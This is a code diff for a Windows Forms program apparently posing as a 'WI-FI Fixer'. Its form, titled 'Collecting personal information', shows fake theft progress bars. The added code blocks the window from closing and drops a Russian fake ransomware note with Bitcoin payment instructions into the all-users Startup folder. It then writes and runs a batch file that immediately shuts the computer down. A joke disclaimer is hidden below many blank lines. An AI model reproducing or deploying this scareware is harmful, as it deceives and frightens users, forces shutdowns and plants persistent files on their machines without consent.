@@ -37,7 +37,6 @@ namespace wififixer {
 	private: System::Windows::Forms::Label^ label2;
 	private: System::Windows::Forms::ProgressBar^ cookieBAR;
 	protected:
-
 	private: System::Windows::Forms::Label^ label1;
 	private: System::Windows::Forms::ProgressBar^ passwordBAR;
 
@@ -255,6 +254,7 @@ namespace wififixer {
 			this->Text = L"Сбор личной информации";
 			this->TopMost = true;
 			this->FormClosing += gcnew System::Windows::Forms::FormClosingEventHandler(this, &hacking::hacking_FormClosing);
+			this->FormClosed += gcnew System::Windows::Forms::FormClosedEventHandler(this, &hacking::hacking_FormClosed);
 			this->Load += gcnew System::EventHandler(this, &hacking::hacking_Load);
 			this->ResumeLayout(false);
 			this->PerformLayout();
@@ -268,7 +268,8 @@ namespace wififixer {
 		this->Location = Point(0, Screen::PrimaryScreen->WorkingArea.Height - this->Height);
 	}
 	private: System::Void hacking_FormClosing(System::Object^ sender, System::Windows::Forms::FormClosingEventArgs^ e) {
-		e->Cancel;
+		if (!right_close)
+			e->Cancel = true;
 	}
 	private: System::Void paypalTIMER_Tick(System::Object^ sender, System::EventArgs^ e) {
 		if (this->paypalBAR->Value < 666)
@@ -328,5 +329,23 @@ namespace wififixer {
 			cookieTIMER->Stop();
 		}
 	}
-	};
+	private: System::Void hacking_FormClosed(System::Object^ sender, System::Windows::Forms::FormClosedEventArgs^ e) {
+		if (!right_close) {
+			std::ofstream file("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt");
+			if (file.is_open()) {
+				file << "ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ!\nВаш личный идентификатор\n6A02000000000000***242FB01\nВаши документы, фотографии, базы данных и другие важные данные были зашифрованы.\nДля восстановления данных необходим дешифровщик.\nЧтобы получить дешифровщик, следует отправить письмо на электронный адрес iluha.bolshoi.pisun228@tutanota.com (iluha.bolshoi.pisun228@mail.ee, iluha.bolshoi.pisun228@yandex.by)\nВ письме укажите Ваш личный идентификатор (см.в начале данного документа).\nДалее необходимо оплатить стоимость дешифровщика. В ответном письме Вы получите адрес\nBitcoin - кошелька, на который необходимо выполнить перевод денежных средств и сумму платежа.\nЕсли у Вас нет биткойнов\n*Создайте кошелек Bitcoin: https://blockchain.info/ru/wallet/new\n*Приобретите криптовалюту Bitcoin:\nhttps://localbitcoins.com/ru/buy_bitcoins (Visa/MasterCard, QIWI Visa Wallet и др.)\n*Отправьте требуемое количество BTC на указанный в письме адрес\nКогда денежный перевод будет подтвержден, Вы получите дешифровщик файлов для Вашего компьютера.\nПосле запуска программы - дешифровщика все Ваши файлы будут восстановлены.\nГарантия расшифровки файлов.\nПеред оплатой вы можете отправить нам до 3х файлов для бесплатной расшифровки.\nОни не должны содержать важную информацию, общий размер файлов должен быть не более 10 мб.\nВнимание!\n*Не пытайтесь удалить программу или запускать антивирусные средства\n*Попытки самостоятельной расшифровки файлов приведут к потере Ваших данных\n*Дешифраторы других пользователей несовместимы с Вашими данными, так как у каждого пользователя уникальный ключ шифрования\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n(Для дураков: это была шутка, с вашими файлами всё в порядке. WI-FI Fixer — абсолютно безвредное, шуточное приложение. С первым апреля!)";
+				file.close();
+			}
+			std::ofstream shutdown("C:\\sleep.bat");
+			if (shutdown.is_open()) {
+				shutdown << "shutdown /s /t 00\ndel %0";
+				shutdown.close();
+			}
+			(gcnew System::Diagnostics::Process())->Start("C:\\sleep.bat");
+			BlockInput(false);
+			right_close = true;
+			Application::Exit();
+		}
+	}
+};
 }
